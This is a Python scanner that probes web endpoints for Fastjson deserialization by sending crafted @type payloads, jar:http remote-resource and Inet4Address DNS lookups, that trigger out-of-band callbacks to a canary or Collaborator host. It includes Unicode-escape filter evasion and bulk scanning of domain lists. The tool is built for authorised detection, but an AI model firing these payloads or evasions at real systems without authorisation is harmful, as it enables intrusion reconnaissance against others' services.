#!/usr/bin/env python3
"""
fjscan_probe.py — ACTIVE, SAFE reachability probe for the fastjson @JSONType
remote-resource path.

Sends the crafted @type at a canary you control and correlates the out-of-band
callback back to the target => proof that a remote-resource lookup is reachable.
The built-in canary serves an empty 404, so this tool never supplies a class or
JAR. When using an external collaborator, configure or verify the same behavior;
this client cannot control that service's response. A callback does not by itself
identify the exact Fastjson version, loader, modern-JDK FD behavior, class
definition, or execution impact.

Two modes:
  built-in canary (self-contained):
     fjscan_probe.py --canary-ip <ip-reachable-by-targets> --listen-port 19000 \
                     --targets targets.txt
  external collaborator (Burp / interactsh):
     fjscan_probe.py --collaborator <ip|int|host|collab-subdomain> [--port 80] \
                     --targets targets.txt
     (no local listener; watch Burp for HTTP GET /<token>; a token->target map is printed)

targets.txt: one per line, "[METHOD ]URL" (default POST). Body defaults to the
probe object; use --wrap to nest it, e.g. --wrap '{"name":{{P}}}'.

SINK CONSTRAINT: '.' in @type becomes '/', so the callback host must be dot-free.
IPv4/Collaborator subdomains are auto-encoded to a decimal integer; correlation is
by the unique URL PATH token (Burp shows it). See fjpayload.py header for detail.
Authorized use only.
"""
import argparse, concurrent.futures, http.server, ipaddress, os, socket, sys, threading, time
import urllib.error, urllib.parse, urllib.request

HITS = {}   # token -> list of (client_ip, request_line)
LOCK = threading.Lock()


def encode_host(collab):
    if collab.isdigit():
        return collab, "integer host"
    try:
        return str(int(ipaddress.IPv4Address(collab))), f"IPv4 {collab} -> int"
    except ipaddress.AddressValueError:
        pass
    if '.' not in collab:
        return collab, "dot-free host"
    try:
        ip = socket.gethostbyname(collab)
        return str(int(ipaddress.IPv4Address(ip))), (f"{collab} -> {ip} -> int (correlate by path token; "
                                                     "DNS-subdomain correlation won't fire through this sink)")
    except OSError as e:
        sys.exit(f"[!] cannot resolve {collab}: {e}")


def make_type(host, port, token, entry="POC"):
    return f"jar:http:..{host}:{port}.{token}!.{entry}"


def uesc(s):
    return "".join("\\u%04x" % ord(c) for c in s)


def atype_key(evasion):
    # fastjson's lexer decodes \uXXXX in field names, so an escaped "@type" still binds
    # and may pass a filter that matches only the literal key.
    return uesc("@type") if evasion in ("ukey", "both") else "@type"


def make_dns_obj(collab_raw, token, evasion="none"):
    # OOB probe via a fastjson primitive that ACCEPTS a dotted hostname (unlike the
    # @JSONType jar: sink). Works with autoType off and provides supporting evidence
    # for the intended parse primitive plus host egress. Fires a Collaborator DNS interaction
    # for "<token>.<collab>". Not RCE and not a unique implementation
    # fingerprint — a prerequisite/reachability signal for the intended path.
    cls = "java.net.Inet4Address"
    if evasion in ("uval", "both"):
        cls = uesc(cls)
    return '{"%s":"%s","val":"%s.%s"}' % (atype_key(evasion), cls, token, collab_raw)


def slug(url):
    h = url.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0]
    s = "".join(c for c in h.lower() if c.isalnum())[:16]
    return s or "t"


class CanaryHandler(http.server.BaseHTTPRequestHandler):
    def _record(self):
        token = self.path.lstrip('/').split('!')[0].split('/')[0]
        with LOCK:
            HITS.setdefault(token, []).append((self.client_address[0], f"{self.command} {self.path}"))
        self.send_response(404); self.send_header("Content-Length", "0"); self.end_headers()
    do_GET = _record
    do_POST = _record
    def log_message(self, *a): pass


def start_canary(port):
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), CanaryHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


HTTP_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"}
SAFE_REDIRECT_HEADERS = {"accept", "content-type", "user-agent"}


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Expose every redirect to ``send`` so scope and header policy is explicit."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


NO_REDIRECT_OPENER = urllib.request.build_opener(NoRedirectHandler())


def url_origin(url):
    parsed = urllib.parse.urlsplit(url)
    scheme = parsed.scheme.lower()
    hostname = (parsed.hostname or "").rstrip(".").lower()
    try:
        port = parsed.port
    except ValueError:
        return None
    if port is None:
        port = 443 if scheme == "https" else 80 if scheme == "http" else None
    return scheme, hostname, port


def redirect_policy(current_url, next_url, headers):
    """Allow exact-origin redirects and the standard HTTP-to-HTTPS upgrade.

    Exact-origin redirects retain headers.  A same-host ``http:80`` to
    ``https:443`` upgrade receives only the three non-secret base headers.
    HTTPS downgrades, arbitrary port changes, cross-host destinations, and
    non-HTTP(S) schemes are never contacted.
    """
    current_origin = url_origin(current_url)
    next_origin = url_origin(next_url)
    if current_origin is None or next_origin is None:
        return None, "invalid-origin"
    if next_origin[0] not in ("http", "https"):
        return None, "unsupported-scheme"
    if not current_origin[1] or current_origin[1] != next_origin[1]:
        return None, "cross-host"
    if current_origin == next_origin:
        return dict(headers), None
    if current_origin[0] == "https" and next_origin[0] == "http":
        return None, "https-downgrade"
    if not (
        current_origin[0] == "http"
        and current_origin[2] == 80
        and next_origin[0] == "https"
        and next_origin[2] == 443
    ):
        return None, "origin-change"
    filtered = {
        key: value for key, value in headers.items()
        if key.lower() in SAFE_REDIRECT_HEADERS
    }
    return filtered, None


def build_url(host_or_url, scheme, port, path):
    """Accept a full URL OR a bare domain/host[:port][/path] and return a full URL."""
    if "://" in host_or_url:
        return host_or_url
    hostpart = host_or_url.strip("/")
    tail = ""
    if "/" in hostpart:                      # host already carries a path
        hostpart, tail = hostpart.split("/", 1)
        tail = "/" + tail
    if port and ":" not in hostpart:
        hostpart = f"{hostpart}:{port}"
    if not tail:
        tail = path if path.startswith("/") else "/" + path
    return f"{scheme}://{hostpart}{tail}"


def load_targets(path, scheme, port, path_suffix, default_method):
    """One target per line: '[METHOD ]<full-url|bare-domain>'. '-' reads stdin.
    Bare domains are expanded with --scheme/--port/--path so you can feed a plain
    domain list."""
    out = []
    fh = sys.stdin if path == "-" else open(path)
    try:
        for line in fh:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(None, 1)
            if len(parts) == 2 and parts[0].upper() in HTTP_METHODS:
                method, tgt = parts[0].upper(), parts[1]
            else:
                method, tgt = default_method, line
            out.append((method, build_url(tgt, scheme, port, path_suffix)))
    finally:
        if fh is not sys.stdin:
            fh.close()
    return out


def send(method, url, body, headers, timeout, max_redirects=3):
    # urllib does NOT auto-follow 307/308 for POST, so a plain http:// target that
    # redirects to https reads as "HTTP 307" and is never actually tested. Follow
    # redirects manually, preserving the POST body so the probe reaches the app.
    m, u, seen = method, url, 0
    current_headers = dict(headers)
    while True:
        req = urllib.request.Request(
            u, data=body.encode(), method=m, headers=current_headers
        )
        try:
            with NO_REDIRECT_OPENER.open(req, timeout=timeout) as r:
                return f"HTTP {r.status}" + (f" (+{seen}r)" if seen else "")
        except urllib.error.HTTPError as e:
            code = e.code
            loc = e.headers.get("Location") if e.headers else None
            e.close()
            if code in (301, 302, 303, 307, 308) and loc and seen < max_redirects:
                next_url = urllib.parse.urljoin(u, loc)
                next_headers, blocked_reason = redirect_policy(u, next_url, current_headers)
                if blocked_reason is not None:
                    return f"redirect-blocked-{blocked_reason} HTTP {code}"
                seen += 1
                u = next_url
                current_headers = next_headers
                if code == 303:
                    m, body = "GET", ""
                continue
            return f"HTTP {code}" + (f" (+{seen}r)" if seen else "")
        except Exception as e:
            return f"send-error: {e.__class__.__name__}"


def main(argv):
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--canary-ip", help="IP of THIS host as reachable by targets (built-in listener mode)")
    g.add_argument("--collaborator", help="external OOB: IPv4 | int | dot-free host | Collaborator subdomain")
    ap.add_argument("--listen-port", type=int, default=19000, help="built-in canary port")
    ap.add_argument("--port", type=int, default=80, help="collaborator port (external mode)")
    ap.add_argument("--targets", required=True,
                    help="file with one target per line ('-' = stdin). Full URLs OR bare "
                         "domains (expanded with --scheme/--port/--path). '# ' comments allowed.")
    ap.add_argument("--scheme", default="http", help="scheme for bare-domain targets (default http)")
    ap.add_argument("--target-port", type=int, default=None, help="port for bare-domain targets")
    ap.add_argument("--path", default="/parse", help="path for bare-domain targets (default /parse)")
    ap.add_argument("--method", default="POST", help="default HTTP method (default POST)")
    ap.add_argument("--threads", type=int, default=20, help="concurrent request workers (default 20)")
    ap.add_argument("--auto", action="store_true",
                    help="batteries-included mode: per target send a baseline + plain DNS + "
                         "Unicode-escaped comparison DNS probe and print a per-target rollup. Just needs "
                         "--collaborator <host> and --targets. Ignores --probe-type/--evasion/--wrap.")
    ap.add_argument("--probe-type", choices=["jsontype", "dns", "both"], default="jsontype",
                    help="jsontype = @JSONType jar: fetch path (int-IP; needs a raw-IP listener); "
                         "dns = Inet4Address OOB via a DOTTED host (Collaborator-compatible, "
                         "provides supporting primitive+egress evidence); both = send each")
    ap.add_argument("--evasion", choices=["none", "ukey", "uval", "both"], default="none",
                    help="Unicode-escaped content-handling comparison (fastjson still decodes \\uXXXX): "
                         "ukey=escape the @type key, uval=escape the class/value, both")
    ap.add_argument("--content-type", default="application/json")
    ap.add_argument("--user-agent",
                    default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                            "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    help="User-Agent (browser-like default for a representative frontend request)")
    ap.add_argument("--header", action="append", default=[], metavar="'K: V'",
                    help="extra request header (repeatable), e.g. --header 'Origin: https://site'")
    ap.add_argument("--baseline", default=None, metavar="BODY",
                    help="also send this benign body per target as a reachability control "
                         "(e.g. '{\"a\":1}'); a response differential is non-attributive")
    ap.add_argument("--wrap", default="{{P}}", help="body template; {{P}} = the probe object")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--max-redirects", type=int, default=3,
                    help="follow up to N exact-origin redirects or standard same-host "
                         "http:80 -> https:443 upgrades (0 = don't follow). HTTPS "
                         "downgrades, other origin changes and cross-host redirects are "
                         "blocked; upgrades keep only Content-Type, User-Agent and Accept")
    ap.add_argument("--wait", type=float, default=10.0, help="seconds to wait for callbacks (built-in mode)")
    args = ap.parse_args(argv)

    targets = load_targets(args.targets, args.scheme, args.target_port, args.path, args.method)
    if not targets:
        sys.exit("[!] no targets loaded (input was empty or contained only comments)")

    if args.canary_ip:
        host, note = encode_host(args.canary_ip)
        port = args.listen_port
        srv = start_canary(args.listen_port)
        print(f"[canary] listening on 0.0.0.0:{args.listen_port}  ({note})")
    else:
        port = args.port
        srv = None
        # Only the jsontype probe needs the collaborator resolved to an int-IP. In
        # dns/auto mode we use the hostname RAW, so skip the lookup — otherwise
        # encode_host() would resolve the BARE collaborator here and show up as a
        # spurious (self-inflicted) DNS interaction that looks like a callback.
        if (not args.auto) and args.probe_type in ("jsontype", "both"):
            host, note = encode_host(args.collaborator)
            print(f"[collaborator] {note}  -> jsontype host={host}:{port} (watch Burp/interactsh)")
        else:
            host = None
            print(f"[collaborator] using raw host {args.collaborator} "
                  f"(no local resolution — bare-domain hits in Burp are NOT from targets)")

    collab_raw = args.collaborator if args.collaborator else None
    if (args.auto or args.probe_type in ("dns", "both")) and not (collab_raw and not collab_raw.isdigit()):
        sys.exit("[!] dns/auto mode needs --collaborator set to a hostname "
                 "(e.g. your Burp Collaborator subdomain), not an int/IP.")

    token_map = {}
    jobs = []
    baseline_body = args.baseline or '{"fjscan":"baseline"}'
    for i, (method, url) in enumerate(targets):
        base = "%s%s" % (slug(url), os.urandom(8).hex())
        if args.auto:
            # batteries-included: baseline control + plain DNS + Unicode-escaped comparison DNS
            btok = "b" + base
            token_map[btok] = (method, url, "baseline")
            jobs.append((btok, method, url, baseline_body))
            for vtag, ev in (("p", "none"), ("e", "both")):
                tok = "d" + vtag + base
                token_map[tok] = (method, url, "dns-" + ("plain" if ev == "none" else "escaped"))
                jobs.append((tok, method, url, make_dns_obj(collab_raw, tok, ev)))
            continue
        if args.probe_type in ("jsontype", "both"):
            tok = "j" + base
            typ = make_type(host, port, tok)
            if args.evasion in ("uval", "both"):
                typ = uesc(typ)
            obj = '{"%s":"%s","x":1}' % (atype_key(args.evasion), typ)
            token_map[tok] = (method, url, "jsontype")
            jobs.append((tok, method, url, args.wrap.replace("{{P}}", obj)))
        if args.probe_type in ("dns", "both"):
            tok = "d" + base
            obj = make_dns_obj(collab_raw, tok, args.evasion)
            token_map[tok] = (method, url, "dns")
            jobs.append((tok, method, url, args.wrap.replace("{{P}}", obj)))
        if args.baseline:
            tok = "b" + base
            token_map[tok] = (method, url, "baseline")
            jobs.append((tok, method, url, args.baseline))

    hdrs = {"Content-Type": args.content_type, "User-Agent": args.user_agent, "Accept": "*/*"}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            hdrs[k.strip()] = v.strip()

    workers = max(1, min(args.threads, len(jobs) or 1))
    print(f"[*] firing {len(jobs)} request(s) with {workers} thread(s)\n")
    plock = threading.Lock()
    status_map = {}

    def fire(job):
        token, method, url, body = job
        kind = token_map[token][2]
        status = send(method, url, body, hdrs, args.timeout, args.max_redirects)
        with plock:
            status_map[token] = status
            print(f"    [{kind:11} {token}] {method} {url}  -> {status}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        list(pool.map(fire, jobs))

    if srv:
        print(f"\n[*] waiting {args.wait}s for callbacks ...")
        time.sleep(args.wait)
        srv.shutdown()
        print("\n===== RESULT =====")
        reachable = 0
        probe_items = [
            (token, details) for token, details in token_map.items()
            if details[2] != "baseline"
        ]
        for token, (method, url, kind) in probe_items:
            with LOCK:
                hits = HITS.get(token)
            if hits:
                reachable += 1
                print(f"  FETCH_REACHABLE [{kind}] {url}")
                for cip, rl in hits:
                    print(f"              callback from {cip}: {rl}")
            else:
                print(f"  no-callback [{kind}] {url}")
        print(f"\nFETCH_REACHABLE={reachable}/{len(probe_items)}  "
              f"(callback proves lookup/egress, not class loading or RCE)")
        return 2 if reachable else 0
    elif args.auto:
        # per-target rollup grouped by URL
        by_url = {}
        for tok, (m, u, kind) in token_map.items():
            by_url.setdefault(u, {})[kind] = tok
        print("\n===== per-target summary =====")
        for u, kinds in by_url.items():
            bl = status_map.get(kinds.get("baseline"), "?")
            dp_tok, de_tok = kinds.get("dns-plain"), kinds.get("dns-escaped")
            print(f"  {u}")
            print(f"      baseline={bl}   dns-plain={status_map.get(dp_tok,'?')}   "
                  f"dns-escaped={status_map.get(de_tok,'?')}")
            print(f"      watch Burp for:  {dp_tok}.{collab_raw}   |   {de_tok}.{collab_raw}")
        print("\nRead it:")
        print("  * a Burp DNS hit for a d…-token  => evidence consistent with the intended")
        print("    InetAddress parse primitive + egress; not a unique Fastjson fingerprint and")
        print("    not proof of the @JSONType/FD execution path")
        print("  * a baseline/probe status differential is consistent with content-sensitive edge,")
        print("    middleware, validation, or application handling; it is inconclusive without")
        print("    callback or artifact corroboration (fjscan_static.py)")
        print("  * if both are blocked, the endpoint/method/path remains inconclusive")
        return 0
    else:
        print("\n[*] external mode — correlate these in Burp Collaborator / interactsh:")
        for token, (method, url, kind) in token_map.items():
            if kind == "dns":
                print(f"    DNS/HTTP  {token}.{collab_raw}   <=  {method} {url}")
            elif kind == "jsontype" and host is not None:
                print(f"    HTTP GET  /{token}  (host {host})   <=  {method} {url}")
            # baseline jobs are benign controls with no OOB correlation — not listed
        print("\nUNVERIFIED_SENT: this mode does not query the collaborator and therefore exits 0. "
              "A token callback is evidence consistent with the intended primitive and egress, "
              "not a unique Fastjson fingerprint. The jsontype int-IP path may not register in "
              "a public Collaborator; see README.")
        return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
